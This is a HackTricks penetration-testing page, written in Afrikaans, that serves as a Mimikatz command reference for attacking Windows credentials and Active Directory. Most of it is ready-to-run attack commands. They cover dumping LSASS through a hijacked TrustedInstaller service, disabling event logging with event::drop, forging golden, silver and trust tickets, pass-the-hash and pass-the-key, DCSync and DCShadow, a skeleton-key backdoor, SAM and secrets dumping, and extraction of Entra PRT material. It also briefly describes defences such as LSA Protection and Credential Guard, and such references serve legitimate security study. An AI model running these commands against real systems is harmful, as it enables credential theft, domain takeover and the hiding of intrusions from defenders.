# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Gaan die oorspronklike na vir verdere inligting!<sup>[[3]](#references)</sup>

## LM en Clear-Text in memory

Vanaf Windows 8.1 en Windows Server 2012 R2 is beduidende maatreëls geïmplementeer om teen credential theft te beskerm:

- **LM hashes en plain-text passwords** word nie meer in memory gestoor nie om security te verbeter. ’n Spesifieke registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, moet met ’n DWORD-waarde van `0` gekonfigureer word om Digest Authentication te deaktiveer, sodat "clear-text" passwords nie in LSASS gecache word nie.

- **LSA Protection** word ingestel om die Local Security Authority (LSA)-proses teen ongemagtigde memory reading en code injection te beskerm. Dit word bereik deur LSASS as ’n protected process te merk. Aktivering van LSA Protection behels:
1. Verander die registry by _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` op `dword:00000001` te stel.
2. Implementeer ’n Group Policy Object (GPO) wat hierdie registry change oor bestuurde toestelle afdwing.

Ten spyte van hierdie protections kan tools soos Mimikatz LSA Protection met spesifieke drivers omseil, hoewel sulke aksies waarskynlik in event logs aangeteken sal word.

Op moderne workstations is dit selfs belangriker omdat **Credential Guard by verstek op baie Windows 11 22H2+ en Windows Server 2025 domain-joined, non-DC systems geaktiveer is**, terwyl **LSASS-as-PPL by verstek op nuwe Windows 11 22H2+ installs geaktiveer is**. In die praktyk beteken dit dat `sekurlsa::logonpasswords` dikwels minder materiaal oplewer as wat ouer tradecraft verwag het, en operators toenemend oorskakel na **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, of **CloudAP/PRT-oriented modules**. Vir die protection-kant, kyk na [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administrators het gewoonlik SeDebugPrivilege, wat hulle in staat stel om programme te debug. Hierdie privilege kan beperk word om ongemagtigde memory dumps te voorkom, ’n algemene technique wat deur attackers gebruik word om credentials uit memory te onttrek. Selfs wanneer hierdie privilege egter verwyder is, kan die TrustedInstaller-account steeds memory dumps uitvoer deur ’n customized service configuration te gebruik:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Dit laat toe dat die `lsass.exe`-geheue na ’n lêer gedump word, wat dan op ’n ander stelsel ontleed kan word om credentials te onttrek:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz-opsies

Event log-manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van event logs en die patching van die Event service om te voorkom dat nuwe events gelog word. Hieronder is die commands vir die uitvoering van hierdie aksies:

#### Skoonmaak van Event Logs

- **Command**: Hierdie aksie is daarop gemik om die event logs te verwyder, wat dit moeiliker maak om kwaadwillige aktiwiteite na te spoor.
- Mimikatz verskaf nie 'n direkte command in sy standaarddokumentasie om event logs direk via sy command line skoon te maak nie. Manipulasie van event logs behels egter gewoonlik die gebruik van system tools of scripts buite Mimikatz om spesifieke logs skoon te maak (byvoorbeeld deur PowerShell of Windows Event Viewer te gebruik).

#### Eksperimentele Feature: Patching van die Event Service

- **Command**: `event::drop`
- Hierdie eksperimentele command is ontwerp om die Event Logging Service se gedrag te wysig, wat dit effektief verhoed om nuwe events aan te teken.
- Voorbeeld: `mimikatz "privilege::debug" "event::drop" exit`

- Die `privilege::debug` command verseker dat Mimikatz met die nodige privileges werk om system services te wysig.
- Die `event::drop` command patch dan die Event Logging service.

### Kerberos Ticket Attacks

Gebruik die commands hieronder as vinnige syntax-herinneringe. Die toegewyde bladsye vir [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), en [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) bevat die bygewerkte AES/PAC/opsec-nuanses.

### Golden Ticket Creation

'n Golden Ticket laat domain-wide access impersonation toe. Belangrike command en parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Die domain-naam.
- `/sid`: Die domain se Security Identifier (SID).
- `/user`: Die username wat ge-impersonate moet word.
- `/krbtgt`: Die NTLM hash van die domain se KDC service account.
- `/ptt`: Injecteer die ticket direk in memory.
- `/ticket`: Stoor die ticket vir latere gebruik.

Voorbeeld:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets verleen toegang tot spesifieke dienste. Belangrike opdrag en parameters:

- Command: Soortgelyk aan Golden Ticket, maar teiken spesifieke dienste.
- Parameters:
- `/service`: Die diens om te teiken (bv. cifs, http).
- Ander parameters soortgelyk aan Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets word gebruik om toegang tot hulpbronne oor domeine heen te verkry deur trust relationships te benut. Belangrike command en parameters:

- Command: Soortgelyk aan Golden Ticket, maar vir trust relationships.
- Parameters:
- `/target`: Die teikendomein se FQDN.
- `/rc4`: Die NTLM hash vir die trust account.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Bykomende Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- Lys alle Kerberos-tickets vir die huidige gebruikersessie.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Injecteer Kerberos-tickets vanaf cache-lêers.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Laat toe dat 'n Kerberos-ticket in 'n ander sessie gebruik word.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Verwyder alle Kerberos-tickets uit die sessie.
- Nuttig voordat ticket manipulation commands gebruik word om konflikte te vermy.

### Over-Pass-the-Hash / Pass-the-Key

As `RC4` disabled of onbetroubaar is, kan Mimikatz **AES128/AES256 Kerberos keys** in die huidige aanmeldingsessie patch, in plaas daarvan om slegs 'n NT hash te gebruik. Dit pas gewoonlik beter by moderne domeine as om `sekurlsa::pth` as slegs NTLM te behandel.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` hergebruik die huidige proses in plaas daarvan om 'n nuwe konsole te begin, wat handig is wanneer jy onmiddellik dinge soos `lsadump::dcsync` in dieselfde konteks wil uitvoer.

### Active Directory-manipulering

- **DCShadow**: Laat 'n masjien tydelik as 'n DC optree vir manipulering van AD-objekte. Sien [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Boots 'n DC na om wagwoorddata aan te vra. Sien [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Toegang tot geloofsbriewe

- **LSADUMP::LSA**: Onttrek geloofsbriewe uit LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Neem die identiteit van 'n DC aan deur 'n rekenaarrekening se wagwoorddata te gebruik.

- _Geen spesifieke opdrag vir NetSync is in die oorspronklike konteks verskaf nie._

- **LSADUMP::SAM**: Kry toegang tot die plaaslike SAM-databasis.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: De-enkripteer geheime wat in die register gestoor is.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Stel 'n nuwe NTLM-hash vir 'n gebruiker.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Verkry vertrouensverifikasie-inligting.
- `mimikatz "lsadump::trust" exit`

### Wolk-geloofsbriewe / Entra ID

Op **Entra ID**- of **hibried-aangeslote** gashere kan `sekurlsa::cloudap` gekasde **Primary Refresh Token (PRT)**-materiaal uit LSASS blootlê. Indien die geassosieerde Proof-of-Possession-sleutel deur sagteware beskerm word, kan `dpapi::cloudapkd` die duidelike/afgeleide sleutelmateriaal aflei wat benodig word vir daaropvolgende **Pass-the-PRT**-werksvloeie.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Dit word baie moeiliker wanneer die sleutel deur TPM gerugsteun word, maar dit is die moeite werd om op hybrid endpoints te kontroleer, omdat die gekaste CloudAP-data interessanter as klassieke `wdigest`-uitset kan wees.<sup>[[2]](#references)</sup> Vir die cloud-side abuse chain, sien [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Diverse

- **MISC::Skeleton**: Injecteer 'n backdoor in LSASS op 'n DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Verkry backup-regte.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Verkry debug-privileges.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Wys credentials vir aangemelde gebruikers.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extraheer Kerberos-tickets uit memory.
- `mimikatz "sekurlsa::tickets /export" exit`

### SID and Token Manipulation

- **SID::add/modify**: Verander SID en SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Geen spesifieke command vir modify in die oorspronklike konteks nie._

- **TOKEN::Elevate**: Impersonate tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Laat verskeie RDP-sessies toe.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lys TS/RDP-sessies.
- _Geen spesifieke command vir TS::Sessions in die oorspronklike konteks verskaf nie._

### Vault

- Extraheer passwords uit Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
